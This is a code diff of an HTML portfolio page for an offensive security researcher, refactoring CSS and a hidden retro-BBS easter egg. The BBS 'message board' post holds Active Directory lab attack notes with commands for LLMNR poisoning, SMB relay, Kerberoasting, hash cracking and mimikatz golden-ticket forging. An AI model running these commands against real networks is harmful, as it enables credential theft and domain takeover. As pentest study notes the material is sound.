@@ -1,5 +1,4 @@
 ---
-// Empty frontmatter - just render static HTML
 ---
 
 <!DOCTYPE html>
@@ -9,257 +8,27 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1" />
 	<title>Connor Dedic | Offensive Security Researcher</title>
 	<style>
-		:root {
-			--bg: #0c0d10;
-			--fg: #fefefe;
-			--accent-red: #d10000;
-			--text-muted: #888888;
-			--border: #333333;
-		}
-
-		* {
-			margin: 0;
-			padding: 0;
-			box-sizing: border-box;
-		}
-
-		html {
-			color-scheme: dark;
-			overflow: hidden;
-			height: 100%;
-		}
-
-		body {
-			background: var(--bg);
-			color: var(--fg);
-			font-family: "Courier New", monospace;
-			line-height: 1.0;
-			font-size: 14px;
-			-webkit-text-size-adjust: 140%;
-			overflow: hidden;
-			height: 100%;
-		}
-
-		body.bbs-active {
-			overflow: hidden;
-		}
-
-		.container {
-			display: flex;
-			align-items: center;
-			justify-content: center;
-			height: 100vh;
-			padding: 2rem 1rem;
-			overflow: hidden;
-		}
-
-		.portfolio-content {
-			display: inline-block;
-			text-align: left;
-			white-space: pre-wrap;
-			overflow-x: auto;
-			font-family: "Courier New", monospace;
-		}
-
-		.portfolio-content pre {
-			margin: 0;
-			white-space: pre;
-			word-wrap: normal;
-			overflow-x: auto;
-			font-family: "Courier New", monospace;
-			font-size: 14px;
-		}
-
-		.portfolio-content pre a {
-			color: var(--accent-red);
-			text-decoration: none;
-			font-family: "Courier New", monospace;
-			font-size: 14px;
-		}
-
-		.portfolio-content pre a:hover {
-			text-decoration: underline;
-		}
-
-		.header {
-			text-align: center;
-			margin-bottom: 2rem;
-		}
-
-		.name {
-			font-size: 1.2rem;
-			font-weight: 700;
-			margin-bottom: 0.5rem;
-			letter-spacing: 0;
-		}
-
-		.tagline {
-			font-size: 0.9rem;
-			color: var(--text-muted);
-			margin-bottom: 1rem;
-		}
-
-		.bio {
-			color: var(--fg);
-			line-height: 1.5;
-			margin: 1rem 0;
-		}
-
-		.section {
-			margin: 1rem 0;
-		}
-
-		.section-title {
-			font-size: 0.9rem;
-			text-transform: uppercase;
-			letter-spacing: 0;
-			color: var(--fg);
-			margin-bottom: 0.5rem;
-		}
-
-		.resume-content {
-			margin: 0.5rem 0;
-		}
-
-		.resume-item {
-			margin-bottom: 0.3rem;
-		}
-
-		.resume-item strong {
-			color: var(--fg);
-		}
-
-		.contact-links {
-			display: inline;
-			margin: 0.5rem 0;
-		}
-
-		.contact-links a {
-			margin-right: 2rem;
-		}
-
-		a {
-			color: var(--accent-red);
-			text-decoration: none;
-		}
-
-		a:hover {
-			text-decoration: underline;
-		}
-
-		.dial-in-btn {
-			display: block;
-			margin-top: 1.5rem;
-			padding: 0.3rem 0.8rem;
-			border: 1px solid var(--accent-red);
-			color: var(--accent-red);
-			background: transparent;
-			font-size: 0.9rem;
-			font-weight: 400;
-			cursor: pointer;
-			letter-spacing: 0;
-			transition: all 0.1s;
-			font-family: "Courier New", monospace;
-		}
-
-		.dial-in-btn:hover {
-			background: var(--accent-red);
-			color: var(--bg);
-		}
-
-		.dial-in-btn:active {
-			opacity: 0.7;
-		}
-
-		@media (max-width: 768px) {
-			body {
-				font-size: 13px;
-			}
-
-			.container {
-				padding: 1rem;
-			}
-		}
-
-		/* BBS Styles */
-		#bbs-root {
-			position: fixed;
-			top: 0;
-			left: 0;
-			width: 100%;
-			height: 100%;
-			background: var(--bg);
-			z-index: 9999;
-			overflow: hidden;
-			display: none;
-			flex-direction: column;
-		}
-
-		#bbs-root.bbs-active {
-			display: flex;
-		}
-
-		.bbs-container {
-			flex: 1;
-			display: flex;
-			flex-direction: column;
-			overflow: hidden;
-		}
-
-		#dial-in-sequence,
-		#main-menu,
-		#menu-area {
-			flex: 1;
-			overflow-y: auto;
-			padding: 1rem;
-			font-family: "Courier New", monospace;
-			font-size: 14px;
-			line-height: 1.0;
-		}
-
-		#dial-in-sequence {
-			display: flex;
-			align-items: center;
-			justify-content: center;
-			text-align: center;
-		}
-
-		#main-menu,
-		#menu-area {
-			display: none;
-		}
-
-		#main-menu.active,
-		#menu-area.active {
-			display: flex;
-			flex-direction: column;
-		}
-
-		.hint-line {
-			border-top: 1px solid var(--border);
-			padding: 0.3rem 1rem;
-			color: var(--text-muted);
-			font-size: 12px;
-			background: transparent;
-		}
-
-		@media (prefers-reduced-motion: reduce) {
-			* {
-				animation-duration: 0.01ms !important;
-				animation-iteration-count: 1 !important;
-				transition-duration: 0.01ms !important;
-			}
-		}
+		* { margin: 0; padding: 0; box-sizing: border-box; }
+		html, body { background: #0c0d10; color: #fefefe; font-family: "Courier New", monospace; height: 100%; overflow: hidden; }
+		body { line-height: 1.0; font-size: 14px; }
+		.page { display: flex; align-items: center; justify-content: center; height: 100vh; padding: 1rem; }
+		pre { white-space: pre; font-family: "Courier New", monospace; font-size: 14px; margin: 0; overflow: auto; }
+		a { color: #d10000; text-decoration: none; }
+		a:hover { text-decoration: underline; }
+		#bbs-root { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0c0d10; z-index: 9999; overflow: hidden; display: none; flex-direction: column; }
+		#bbs-root.active { display: flex; }
+		.bbs-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+		#bbs-content { flex: 1; overflow-y: auto; padding: 1rem; font-family: "Courier New", monospace; font-size: 14px; line-height: 1.0; }
+		.hint { border-top: 1px solid #333; padding: 0.3rem 1rem; color: #888; font-size: 12px; }
+		.invisible-link { position: fixed; top: 0; right: 0; width: 60px; height: 60px; z-index: 999; cursor: pointer; opacity: 0; }
 	</style>
 </head>
 <body>
-	<div class="container">
-		<div style="position: fixed; top: 0; right: 0; width: 60px; height: 60px; z-index: 999; cursor: pointer; opacity: 0;" id="bbsLink" title="Secret BBS Access"></div>
-		<div class="portfolio-content">
-			<pre>
-┌──────────────────────────────────────────────────────────────────────────────┐
+	<div class="invisible-link" id="bbsLink"></div>
+	<div class="page">
+		<pre>┌──────────────────────────────────────────────────────────────────────────────┐
 │                                                                              │
-│                           <a href="javascript:void(0)">    CONNOR DEDIC    </a>                             │
+│                           <a href="#">    CONNOR DEDIC    </a>                             │
 │                   Offensive Security Researcher & Red Teamer                 │
 │                                                                              │
 └──────────────────────────────────────────────────────────────────────────────┘
@@ -289,440 +58,135 @@
 │                                                                              │
 │  <a href="mailto:connordedicpro@gmail.com">[ EMAIL ]</a> <a href="https://github.com/ConnorDedic" target="_blank" rel="noopener noreferrer">[ GITHUB ]</a> <a href="https://linkedin.com/in/connor-dedic" target="_blank" rel="noopener noreferrer">[ LINKEDIN ]</a> <a href="/ConnorDedicResume.pdf">[ FULL RESUME ]</a>            │
 │                                                                              │
-└──────────────────────────────────────────────────────────────────────────────┘
-</pre>
-		</div>
+└──────────────────────────────────────────────────────────────────────────────┘</pre>
 	</div>
 
 	<div id="bbs-root">
 		<div class="bbs-container">
-			<div id="dial-in-sequence"></div>
-			<div id="main-menu"></div>
-			<div id="menu-area"></div>
-			<div class="hint-line" id="hint-line"></div>
+			<pre id="bbs-content"></pre>
+			<div class="hint" id="hint">[SPACE] skip</div>
 		</div>
 	</div>
 
 	<script>
-		class BBSController {
+		class BBS {
 			constructor() {
-				let hasSeenDial = false;
-				try {
-					hasSeenDial = localStorage.getItem("bbs:seen-dial") === "true";
-				} catch (e) {
-					console.warn("localStorage unavailable");
+				this.state = { mode: 'dial-in', seenDial: this.getSeen() };
+				this.root = document.getElementById('bbs-root');
+				this.content = document.getElementById('bbs-content');
+				this.hint = document.getElementById('hint');
+				document.getElementById('bbsLink').addEventListener('click', () => this.enter());
+				window.addEventListener('keydown', e => this.handleKey(e));
+			}
+			getSeen() { try { return localStorage.getItem('bbs:seen') === '1'; } catch(e) { return false; } }
+			setSeen() { try { localStorage.setItem('bbs:seen', '1'); } catch(e) {} }
+			enter() { this.root.classList.add('active'); this.state.seenDial ? this.menu() : this.dial(); }
+			dial() {
+				this.state.mode = 'dial-in';
+				this.content.textContent = '\n\nCONNECT 56000\nCARRIER ESTABLISHED\nHANDSHAKE...\n\n       ◄ NETRUNNER INCOMING ►\n\n    WELCOME TO THE NETWORK\n    =========================\n\n\n[PRESS ANY KEY TO CONTINUE]\n';
+				this.hint.textContent = '[SPACE/ENTER] skip';
+			}
+			menu() {
+				this.state.mode = 'menu';
+				this.content.textContent = `██╗   ██╗ ██████╗ ███████╗    ██╗   ██╗██╗██████╗ ███████╗███╗   ███╗██╗   ██╗███████╗
+██║   ██║██╔═══██╗██╔════╝    ██║   ██║██║██╔══██╗██╔════╝████╗ ████║██║   ██║██╔════╝
+██║   ██║██║   ██║███████╗    ██║   ██║██║██║  ██║█████╗  ██╔████╔██║██║   ██║███████╗
+╚██╗ ██╔╝██║   ██║╚════██║    ╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║╚════██║
+ ╚████╔╝ ╚██████╔╝███████║     ╚████╔╝ ██║██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝███████║
+  ╚═══╝   ╚═════╝ ╚══════╝      ╚═══╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                                                                              │
+│  [ 1 ] MESSAGE BOARD                                                        │
+│  [ 2 ] FILE AREA                                                            │
+│  [ 3 ] WHO'S ONLINE                                                         │
+│                                                                              │
+│  [ 0 ] LOG OFF                                                              │
+│                                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘`;
+				this.hint.textContent = '[1-3] select | [0] exit';
+			}
+			handleKey(e) {
+				if (!this.root.classList.contains('active')) return;
+				if (e.key === 'Escape') { this.root.classList.remove('active'); this.state.mode = 'dial-in'; return; }
+				if (this.state.mode === 'dial-in' && (e.key === ' ' || e.key === 'Enter')) { this.setSeen(); this.menu(); return; }
+				if (this.state.mode === 'menu') {
+					if (e.key === '1') this.messageboard();
+					else if (e.key === '2') this.filearea();
+					else if (e.key === '3') this.whosonline();
+					else if (e.key === '0') { this.root.classList.remove('active'); this.state.mode = 'dial-in'; }
 				}
-				this.state = {
-					mode: "dial-in",
-					hasSeenDial: hasSeenDial,
-				};
-
-				this.root = document.getElementById("bbs-root");
-				this.dialInSeq = document.getElementById("dial-in-sequence");
-				this.mainMenu = document.getElementById("main-menu");
-				this.menuArea = document.getElementById("menu-area");
-				this.hintLine = document.getElementById("hint-line");
-
-				this.setupEventListeners();
+				else if (this.state.mode === 'post' && e.key === '0') this.messageboard();
+				else if (this.state.mode === 'file' && e.key === '0') this.menu();
+				else if (this.state.mode === 'online' && e.key === '0') this.menu();
+				else if (this.state.mode === 'file' && e.key === '1') window.location.href = '/ConnorDedicResume.pdf';
+				else if (this.state.mode === 'post' && e.key === '1') this.messageboard();
 			}
-
-			setupEventListeners() {
-				document.getElementById("bbsLink")?.addEventListener("click", () => this.showBbs());
-				window.addEventListener("keydown", (e) => this.handleKeydown(e));
+			messageboard() {
+				this.state.mode = 'post';
+				this.content.textContent = `┌──────────────────────────────────────────────────────────────────────────────┐
+│  Active Directory Attacks                                                   │
+├──────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  LAB ENVIRONMENT                                                             │
+│  2HYDRA-DC         10.0.2.250                                               │
+│  punisher          10.0.2.220                                               │
+│  spiderman         10.0.2.221                                               │
+│                                                                              │
+│  ATTACK METHODOLOGY                                                          │
+│  1. Start with mitm6 and responder                                          │
+│  2. Scan to generate traffic                                                │
+│  3. Check websites for alternate paths                                      │
+│  4. Look for default creds                                                  │
+│  5. Enumerate further based on findings                                     │
+│                                                                              │
+│  KERBEROASTING                                                               │
+│  Grab SPN hashes:                                                            │
+│  impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request             │
+│                                                                              │
+│  GOLDEN TICKET                                                               │
+│  You need: SID and krbtgt hash                                              │
+│  privilege::debug                                                            │
+│  lsadump::lsa /inject /name:krbtgt                                          │
+│  kerberos::golden /User:<User> /domain:<domain> /sid:<SID>                 │
+│                                                                              │
+│  [ 1 ] back | [ 0 ] main menu                                              │
+│                                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘`;
+				this.hint.textContent = '[1] back | [0] main menu';
 			}
-
-			handleKeydown(e) {
-				if (!this.root?.classList.contains("bbs-active")) return;
-
-				if (e.key === "Escape") {
-					this.logOff();
-					return;
-				}
-
-				if (this.state.mode === "dial-in") {
-					if (e.key === " " || e.key === "Enter") {
-						this.skipDial();
-					}
-					return;
-				}
-
-				const key = e.key;
-				if (["1", "2", "3", "0"].includes(key)) {
-					// Only allow specific keys in specific modes
-					if (this.state.mode === "main-menu") {
-						this.handleMenuSelection(key);
-					} else if (this.state.mode === "message-board" && key === "1") {
-						this.showPostView(0);
-					} else if (this.state.mode === "message-board" && key === "0") {
-						this.showMainMenu();
-					} else if (this.state.mode === "post-view" && key === "0") {
-						this.showMessageBoard();
-					} else if (this.state.mode === "file-area" && key === "1") {
-						window.location.href = "/ConnorDedicResume.pdf";
-					} else if (this.state.mode === "file-area" && key === "0") {
-						this.showMainMenu();
-					} else if (this.state.mode === "whos-online" && key === "0") {
-						this.showMainMenu();
-					}
-				}
+			filearea() {
+				this.state.mode = 'file';
+				this.content.textContent = `┌──────────────────────────────────────────────────────────────────────────────┐
+│  FILE AREA                                                                  │
+├──────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  [ 1 ] ConnorDedicResume.pdf                                      120 KB   │
+│                                                                              │
+│  [1] select | [0] main menu                                                │
+│                                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘`;
+				this.hint.textContent = '[1] download | [0] main menu';
 			}
-
-			showBbs() {
-				document.body.classList.add("bbs-active");
-				this.root?.classList.add("bbs-active");
-
-				if (this.state.hasSeenDial) {
-					this.showMainMenu();
-				} else {
-					this.showDialIn();
-				}
-			}
-
-			showDialIn() {
-				this.state.mode = "dial-in";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.remove("active");
-				this.dialInSeq?.classList.add("active");
-
-				this.renderDialIn();
-			}
-
-			renderDialIn() {
-				const seq = [
-					"",
-					"",
-					"CONNECT 56000",
-					"CARRIER ESTABLISHED",
-					"HANDSHAKE...",
-					"",
-					"",
-					"       ◄ NETRUNNER INCOMING ►",
-					"",
-					"",
-					"    WELCOME TO THE NETWORK",
-					"    =========================",
-					"",
-					"",
-					"[PRESS ANY KEY TO CONTINUE]",
-					"",
-				];
-
-				this.dialInSeq.innerHTML = seq
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[SPACE/ENTER] skip");
-			}
-
-			skipDial() {
-				try {
-					localStorage.setItem("bbs:seen-dial", "true");
-				} catch (e) {
-					console.warn("localStorage unavailable");
-				}
-				this.state.hasSeenDial = true;
-				this.showMainMenu();
-			}
-
-			showMainMenu() {
-				this.state.mode = "main-menu";
-				this.dialInSeq?.classList.remove("active");
-				this.menuArea?.classList.remove("active");
-				this.mainMenu?.classList.add("active");
-
-				this.renderMainMenu();
-			}
-
-			renderMainMenu() {
-				const banner = [
-					"██╗   ██╗ ██████╗ ███████╗    ██╗   ██╗██╗██████╗ ███████╗███╗   ███╗██╗   ██╗███████╗",
-					"██║   ██║██╔═══██╗██╔════╝    ██║   ██║██║██╔══██╗██╔════╝████╗ ████║██║   ██║██╔════╝",
-					"██║   ██║██║   ██║███████╗    ██║   ██║██║██║  ██║█████╗  ██╔████╔██║██║   ██║███████╗",
-					"╚██╗ ██╔╝██║   ██║╚════██║    ╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║╚════██║",
-					"╚████╔╝ ╚██████╔╝███████║     ╚████╔╝ ██║██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝███████║",
-					"╚═══╝   ╚═════╝ ╚══════╝      ╚═══╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝",
-					"",
-					"┌──────────────────────────────────────────────────────────────────────────────┐",
-					"│                                                                              │",
-					"│  [ 1 ] MESSAGE BOARD                                                         │",
-					"│  [ 2 ] FILE AREA                                                             │",
-					"│  [ 3 ] WHO'S ONLINE                                                          │",
-					"│                                                                              │",
-					"│  [ 0 ] LOG OFF                                                               │",
-					"│                                                                              │",
-					"└──────────────────────────────────────────────────────────────────────────────┘",
-					"",
-				];
-
-				this.mainMenu.innerHTML = banner
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[1-3] select | [0] exit | [ESC] return");
-			}
-
-			handleMenuSelection(key) {
-				if (this.state.mode === "message-board" && key === "0") {
-					this.showMainMenu();
-					return;
-				}
-				if (this.state.mode === "post-view" && key === "0") {
-					this.showMessageBoard();
-					return;
-				}
-				if (this.state.mode === "file-area" && key === "0") {
-					this.showMainMenu();
-					return;
-				}
-				if (this.state.mode === "whos-online" && key === "0") {
-					this.showMainMenu();
-					return;
-				}
-
-				switch (key) {
-					case "1":
-						this.showMessageBoard();
-						break;
-					case "2":
-						this.showFileArea();
-						break;
-					case "3":
-						this.showWhosOnline();
-						break;
-					case "0":
-						this.logOff();
-						break;
-				}
-			}
-
-
-			showMessageBoard() {
-				this.state.mode = "message-board";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const content = [
-					"",
-					"┌──────────────────────────────────────────────────────────────────────────────┐",
-					"│  MESSAGE BOARD                                                                  │",
-					"├──────────────────────────────────────────────────────────────────────────────┤",
-					"│                                                                                  │",
-					"│  [ 1 ] Active Directory Attacks                                   2026-06-20    │",
-					"│                                                                                  │",
-					"│  [1] read | [0] main menu                                                        │",
-					"│                                                                                  │",
-					"└──────────────────────────────────────────────────────────────────────────────┘",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[1] read | [0] main menu | [ESC] exit");
-			}
-
-			wrapLines(text, width = 76) {
-				const wrapped = [];
-				const lines = text.split("\n");
-
-				for (const line of lines) {
-					if (line.length <= width) {
-						wrapped.push(line);
-					} else {
-						let remaining = line;
-						while (remaining.length > 0) {
-							if (remaining.length <= width) {
-								wrapped.push(remaining);
-								break;
-							}
-							const breakPoint = remaining.lastIndexOf(" ", width) || width;
-							wrapped.push(remaining.substring(0, breakPoint));
-							remaining = remaining.substring(breakPoint).trim();
-						}
-					}
-				}
-				return wrapped;
-			}
-
-			showPostView(index) {
-				this.state.mode = "post-view";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const posts = [
-					{
-						title: "Active Directory Attacks",
-						content: `LAB ENVIRONMENT
-2HYDRA-DC         10.0.2.250
-punisher          10.0.2.220
-spiderman         10.0.2.221
-
-ATTACK METHODOLOGY
-1. Start with mitm6 and responder
-2. Scan to generate traffic
-3. Check websites for alternate paths
-4. Look for default creds
-5. Enumerate further based on findings
-
-Use responder on Linux, Inveigh on Windows
-
-LLMNR POISONING
-Machines in AD request access to services that don't exist.
-Attacker requests user:hash credentials.
-Target sends hash for cracking.
-
-Command: sudo responder -I <adapter> -dPv
-
-HASHCAT ATTACK MODES
-- Wordlist: hashcat -a 0 -m 400 hash dict
-- Wordlist+Rules: hashcat -a 0 -m 0 hash dict -r best64.rule
-- Brute-Force: hashcat -a 3 -m 0 hash ?a?a?a?a?a?a
-- Combinator: hashcat -a 1 -m 0 hash dict1 dict2
-
-SMB RELAY (PASS-THE-HASH)
-Use responder to catch and relay hashes.
-
-Detect vulnerable targets:
-nmap --script=smb2-security-mode.nse -p 445 <target>
-
-Look for: Message signing enabled but not required
-
-Setup relay:
-sudo ntlmrelayx.py -tf targets.txt -smb2support
-sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
-
-Connect: nc 127.0.0.1 11000
-
-KERBEROASTING
-Grab SPN hashes:
-impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
-
-Crack: hashcat -m 13100 hashes.txt wordlist.txt
-
-GOLDEN TICKET
-You need: SID and krbtgt hash
-
-privilege::debug
-lsadump::lsa /inject /name:krbtgt
-kerberos::golden /User:<User> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt> /id:500 /ptt
-
-IPv6 DNS TAKEOVER
-sudo mitm6 -d <domain>
-impacket-ntlmrelayx -6 -t ldaps://<DC-IPv4> -wh <fakeservice>.<domain>.local -l <loot>`
-					}
-				];
-
-				const post = posts[index];
-				const wrappedLines = this.wrapLines(post.content, 74);
-				const content = [
-					"",
-					"┌──────────────────────────────────────────────────────────────────────────────┐",
-					`│  ${post.title.padEnd(74)}  │`,
-					"├──────────────────────────────────────────────────────────────────────────────┤",
-					"│                                                                              │",
-					...wrappedLines.map(line => {
-						const padded = line.padEnd(74);
-						return `│  ${padded}  │`;
-					}),
-					"│                                                                              │",
-					"│  [ 0 ] back to message board                                                │",
-					"│                                                                              │",
-					"└──────────────────────────────────────────────────────────────────────────────┘",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[0] back | [ESC] exit");
-			}
-
-			showFileArea() {
-				this.state.mode = "file-area";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const content = [
-					"",
-					"┌──────────────────────────────────────────────────────────────────────────────┐",
-					"│  FILE AREA                                                                      │",
-					"├──────────────────────────────────────────────────────────────────────────────┤",
-					"│                                                                                  │",
-					"│  [ 1 ] ConnorDedicResume.pdf                                         120 KB    │",
-					"│                                                                                  │",
-					"│  [1] select | [0] main menu                                                     │",
-					"│                                                                                  │",
-					"└──────────────────────────────────────────────────────────────────────────────┘",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[0] main menu | [ESC] exit");
-			}
-
-			showWhosOnline() {
-				this.state.mode = "whos-online";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const content = [
-					"",
-					"┌──────────────────────────────────────────────────────────────────────────────┐",
-					"│  WHO'S ONLINE                                                                   │",
-					"├──────────────────────────────────────────────────────────────────────────────┤",
-					"│                                                                                  │",
-					"│  > SYSOP (San Diego, CA - idle 2m)                                             │",
-					"│  > you (San Diego, CA - active)                                                │",
-					"│  > netrunner (Tokyo, JP - active)                                              │",
-					"│  > h4x0r (Berlin, DE - idle 8m)                                                │",
-					"│  > cipher (London, UK - active)                                                │",
-					"│                                                                                  │",
-					"│  [ 0 ] main menu                                                                │",
-					"│                                                                                  │",
-					"└──────────────────────────────────────────────────────────────────────────────┘",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[0] main menu | [ESC] exit");
-			}
-
-
-			logOff() {
-				document.body.classList.remove("bbs-active");
-				this.root?.classList.remove("bbs-active");
-				this.state.mode = "dial-in";
-			}
-
-			updateHint(text) {
-				if (this.hintLine) {
-					this.hintLine.textContent = text;
-				}
-			}
-
-			escapeHtml(str) {
-				const map = {
-					"&": "&amp;",
-					"<": "&lt;",
-					">": "&gt;",
-					'"': "&quot;",
-					"'": "&#039;",
-				};
-				return str.replace(/[&<>"']/g, (char) => map[char]);
+			whosonline() {
+				this.state.mode = 'online';
+				this.content.textContent = `┌──────────────────────────────────────────────────────────────────────────────┐
+│  WHO'S ONLINE                                                               │
+├──────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  > SYSOP (San Diego, CA - idle 2m)                                         │
+│  > you (San Diego, CA - active)                                            │
+│  > netrunner (Tokyo, JP - active)                                          │
+│  > h4x0r (Berlin, DE - idle 8m)                                            │
+│  > cipher (London, UK - active)                                            │
+│                                                                              │
+│  [ 0 ] main menu                                                            │
+│                                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘`;
+				this.hint.textContent = '[0] main menu';
 			}
 		}
-
-		document.addEventListener("DOMContentLoaded", () => {
-			new BBSController();
-		});
+		new BBS();
 	</script>
 </body>
 </html>
